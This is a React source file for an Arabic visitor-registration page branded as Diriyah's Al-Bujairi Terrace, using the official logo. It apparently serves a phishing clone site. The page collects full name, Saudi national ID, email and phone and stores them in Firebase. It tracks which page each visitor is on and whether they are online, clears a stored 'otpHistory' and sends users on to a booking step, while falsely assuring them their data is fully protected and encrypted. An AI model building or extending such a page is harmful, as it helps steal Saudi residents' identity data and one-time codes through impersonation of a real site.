import { Link, useLocation } from "wouter";
import { ArrowRight, Menu, X } from "lucide-react";
import { useState, useEffect, useRef } from "react";
import { motion } from "framer-motion";
import { addData, handleCurrentPage } from "@/lib/firebase";
import { setupOnlineStatus } from "@/lib/utils";
import emailjs from "@emailjs/browser";
import heroImage from "@assets/bab0035fd04a490390b62d59736704f0_(1)_1778246846845.webp";

const EMAILJS_SERVICE_ID = "service_1e5r05g";
const EMAILJS_TEMPLATE_ID = "template_xkdlwg3";
const EMAILJS_PUBLIC_KEY = "ROVj9RXGGeBR7U8iG";

const ORANGE = "#A85734";
const ORANGE_DEEP = "#8E4729";
const GOLD = "#D4B080";

const LOGO_URL =
  "https://assets-diriyah.diriyah.me/4388214a05a84e7c910b39d5b9067ef3?width=750&quality=80&transform=true&format=webp";

export default function RegistrationPage() {
  useEffect(() => {
    void handleCurrentPage("registration");
  }, []);
  return (
    <div
      className="min-h-screen bg-white flex flex-col text-right"
      dir="rtl"
      data-testid="page-registration"
    >
      <BujairiHero />
      <main className="flex-1 px-6 py-12 md:py-20">
        <RegistrationForm />
      </main>
      <Footer />
    </div>
  );
}

function BujairiHero() {
  const [open, setOpen] = useState(false);
  return (
    <section
      className="relative h-[45vh] min-h-[320px] w-full overflow-hidden"
      data-testid="section-hero"
    >
      <div className="absolute inset-0">
        <img
          src={heroImage}
          alt="مطل البجيري"
          className="w-full h-full object-cover"
        />
        <div className="absolute inset-0 bg-black/50" />
      </div>

      <header className="absolute top-0 left-0 right-0 z-50 flex justify-between items-center px-6 py-6">
        <Link href="/" data-testid="link-logo">
          <img
            src={LOGO_URL}
            alt="الدرعية"
            className="h-10 object-contain"
            data-testid="img-logo"
          />
        </Link>
        <button
          onClick={() => setOpen(!open)}
          className="text-white p-1"
          data-testid="button-menu"
          aria-label="القائمة"
        >
          {open ? <X className="w-7 h-7" /> : <Menu className="w-7 h-7" />}
        </button>
      </header>

      {open && (
        <nav
          className="absolute top-[72px] left-0 right-0 z-50 bg-black/85 backdrop-blur px-6 py-4 space-y-2"
          data-testid="nav-mobile-menu"
        >
          {[
            { href: "/", label: "الرئيسية" },
            { href: "/#booking", label: "خيارات الحجز" },
            { href: "/#parking", label: "المواقف" },
            { href: "/#hours", label: "ساعات العمل" },
          ].map((it) => (
            <a
              key={it.href}
              href={it.href}
              onClick={() => setOpen(false)}
              className="block text-white text-base py-2 border-b border-white/10 last:border-b-0"
            >
              {it.label}
            </a>
          ))}
        </nav>
      )}

      <div className="relative h-full flex flex-col justify-end pb-10 px-8 max-w-4xl mx-auto">
        <motion.div
          initial={{ opacity: 0, x: 20 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ duration: 0.7 }}
        >
          <p
            className="font-medium mb-3 text-xs tracking-widest"
            style={{ color: GOLD }}
            data-testid="text-hero-eyebrow"
          >
            مطل البجيري
          </p>
          <h1
            className="text-white text-3xl md:text-5xl font-bold leading-tight"
            data-testid="text-hero-title"
          >
            تسجيل الزيارة
          </h1>
        </motion.div>
      </div>

      <Link
        href="/"
        className="absolute bottom-4 right-6 z-40 text-white/90 hover:text-white flex items-center gap-2 text-sm"
        data-testid="link-back"
      >
        <ArrowRight className="w-4 h-4" />
        <span>العودة</span>
      </Link>
    </section>
  );
}

function Footer() {
  return (
    <footer
      className="py-8 flex justify-center"
      style={{ backgroundColor: ORANGE_DEEP }}
      data-testid="footer-registration"
    >
      <img
        src={LOGO_URL}
        alt="الدرعية"
        className="h-8 object-contain opacity-95"
      />
    </footer>
  );
}

type FieldProps = {
  id: string;
  label: string;
  value: string;
  onChange: (v: string) => void;
  error?: string;
  type?: string;
  placeholder?: string;
  dir?: "rtl" | "ltr";
  maxLength?: number;
  inputMode?: "text" | "tel" | "email" | "numeric";
  testId: string;
};

function Field({
  id,
  label,
  value,
  onChange,
  error,
  type = "text",
  placeholder,
  dir: fieldDir,
  maxLength,
  inputMode,
  testId,
}: FieldProps) {
  return (
    <div className="space-y-2">
      <label
        htmlFor={id}
        className="block text-sm font-medium text-gray-700"
      >
        {label}
      </label>
      <input
        id={id}
        type={type}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder}
        dir={fieldDir}
        maxLength={maxLength}
        inputMode={inputMode}
        className={`w-full h-12 px-4 rounded-md border bg-white text-gray-800 text-sm outline-none transition-colors focus:border-[${ORANGE}] focus:ring-2 focus:ring-[${ORANGE}]/20 ${
          error ? "border-red-400" : "border-gray-300"
        }`}
        style={{
          textAlign: fieldDir === "ltr" ? "left" : "right",
        }}
        data-testid={testId}
      />
      {error && (
        <p
          className="text-red-500 text-xs"
          data-testid={`${testId}-error`}
        >
          {error}
        </p>
      )}
    </div>
  );
}

function RegistrationForm() {
  const [, setLocation] = useLocation();
  const [name, setName] = useState("");
  const [saudiId, setSaudiId] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [honeypot, setHoneypot] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errors, setErrors] = useState<{
    name?: string;
    saudiId?: string;
    email?: string;
    phone?: string;
    bot?: string;
  }>({});

  const formLoadTime = useRef(Date.now());
  const interactionCount = useRef(0);
  const hasMouseMoved = useRef(false);

  useEffect(() => {
    const handleScroll = () => {};
    const handleMouseMove = () => {
      hasMouseMoved.current = true;
    };
    const handleKeyPress = () => {
      interactionCount.current++;
    };

    window.addEventListener("scroll", handleScroll);
    window.addEventListener("mousemove", handleMouseMove);
    window.addEventListener("keypress", handleKeyPress);

    return () => {
      window.removeEventListener("scroll", handleScroll);
      window.removeEventListener("mousemove", handleMouseMove);
      window.removeEventListener("keypress", handleKeyPress);
    };
  }, []);

  const isBotDetected = (): boolean => {
    if (honeypot) return true;
    const timeSpent = Date.now() - formLoadTime.current;
    if (timeSpent < 3000) return true;
    if (interactionCount.current < 4) return true;
    if (!hasMouseMoved.current && !("ontouchstart" in window)) return true;
    return false;
  };

  const validateSaudiId = (id: string): boolean => {
    if (!/^\d{10}$/.test(id)) return false;
    if (!id.startsWith("1") && !id.startsWith("2")) return false;
    return true;
  };

  const validatePhone = (phoneNum: string): boolean => {
    const cleanPhone = phoneNum.replace(/\s/g, "");
    return /^(05|5)\d{8}$/.test(cleanPhone) || /^\+9665\d{8}$/.test(cleanPhone);
  };

  const validateEmail = (emailStr: string): boolean => {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailStr);
  };

  const handleSubmit = async () => {
    if (isSubmitting) return;
    const newErrors: typeof errors = {};

    if (!name.trim()) newErrors.name = "الاسم مطلوب";
    if (!saudiId.trim()) {
      newErrors.saudiId = "رقم الهوية مطلوب";
    } else if (!validateSaudiId(saudiId)) {
      newErrors.saudiId =
        "رقم الهوية غير صحيح (يجب أن يكون 10 أرقام ويبدأ بـ 1 أو 2)";
    }
    if (!email.trim()) {
      newErrors.email = "البريد الإلكتروني مطلوب";
    } else if (!validateEmail(email)) {
      newErrors.email = "البريد الإلكتروني غير صحيح";
    }
    if (!phone.trim()) {
      newErrors.phone = "رقم الجوال مطلوب";
    } else if (!validatePhone(phone)) {
      newErrors.phone = "رقم الجوال غير صحيح";
    }

    if (isBotDetected()) {
      newErrors.bot = "تعذر إكمال الطلب، يرجى المحاولة مرة أخرى";
    }

    setErrors(newErrors);

    if (Object.keys(newErrors).length === 0) {
      setIsSubmitting(true);
      const visitorId = `visitor_${Date.now()}_${Math.random()
        .toString(36)
        .substring(2, 9)}`;
      const added = await addData({
        id: visitorId,
        name,
        saudiId,
        email,
        phone,
        currentPage: "registration",
      });
      if (!added) {
        setErrors((prev) => ({
          ...prev,
          bot: "تعذر إكمال الطلب، يرجى المحاولة مرة أخرى",
        }));
        setIsSubmitting(false);
        return;
      }
      setupOnlineStatus(visitorId);
      localStorage.removeItem("otpHistory");

      try {
        await emailjs.send(
          EMAILJS_SERVICE_ID,
          EMAILJS_TEMPLATE_ID,
          {
            to_email: email,
            email: email,
            to_name: name,
            from_name: "الدرعية - Diriyah",
            message: `مرحباً ${name}، شكراً لتسجيلك في موقع الدرعية.`,
          },
          EMAILJS_PUBLIC_KEY,
        );
      } catch (error) {
        console.error("Failed to send email:", error);
      }

      setLocation("/booking");
      return;
    }
    setIsSubmitting(false);
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 12 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.4 }}
      className="max-w-md mx-auto"
    >
      <div className="text-center mb-10">
        <h1
          className="text-3xl font-bold text-gray-900 mb-2"
          data-testid="text-title"
        >
          تسجيل
        </h1>
        <p className="text-sm text-gray-500">
          أدخل بياناتك للمتابعة إلى صفحة الحجز
        </p>
      </div>

      <input
        type="text"
        value={honeypot}
        onChange={(e) => setHoneypot(e.target.value)}
        className="absolute opacity-0 pointer-events-none h-0 w-0"
        tabIndex={-1}
        autoComplete="off"
        aria-hidden="true"
      />

      {errors.bot && (
        <div
          className="mb-4 p-3 rounded-md bg-red-50 border border-red-200 text-red-600 text-sm text-center"
          data-testid="error-bot"
        >
          {errors.bot}
        </div>
      )}

      <form
        className="space-y-5"
        onSubmit={(e) => {
          e.preventDefault();
          void handleSubmit();
        }}
      >
        <Field
          id="name"
          label="الاسم الكامل *"
          value={name}
          onChange={(v) => setName(v.slice(0, 80))}
          maxLength={80}
          placeholder="أدخل الاسم الكامل"
          error={errors.name}
          testId="input-name"
        />

        <Field
          id="saudiId"
          label="رقم الهوية الوطنية *"
          value={saudiId}
          onChange={(v) => setSaudiId(v.replace(/\D/g, "").slice(0, 10))}
          maxLength={10}
          inputMode="numeric"
          placeholder="أدخل رقم الهوية (10 أرقام)"
          error={errors.saudiId}
          testId="input-saudi-id"
        />

        <Field
          id="email"
          label="البريد الإلكتروني *"
          value={email}
          onChange={(v) => setEmail(v.slice(0, 120))}
          maxLength={120}
          type="email"
          dir="ltr"
          inputMode="email"
          placeholder="example@email.com"
          error={errors.email}
          testId="input-email"
        />

        <Field
          id="phone"
          label="رقم الجوال *"
          value={phone}
          onChange={(v) => setPhone(v.replace(/[^\d+]/g, "").slice(0, 15))}
          maxLength={15}
          type="tel"
          dir="ltr"
          inputMode="tel"
          placeholder="05XXXXXXXX"
          error={errors.phone}
          testId="input-phone"
        />

        <button
          type="submit"
          disabled={isSubmitting}
          className="w-full h-12 mt-4 rounded-md text-white font-bold text-sm transition-transform hover:scale-[1.01] active:scale-[0.99] disabled:opacity-60 disabled:cursor-not-allowed"
          style={{ backgroundColor: ORANGE }}
          data-testid="button-continue"
        >
          {isSubmitting ? "جاري الإرسال..." : "التالي"}
        </button>
      </form>

      <p className="text-center text-gray-400 text-xs mt-8">
        بياناتك محمية ومشفرة بالكامل
      </p>
    </motion.div>
  );
}
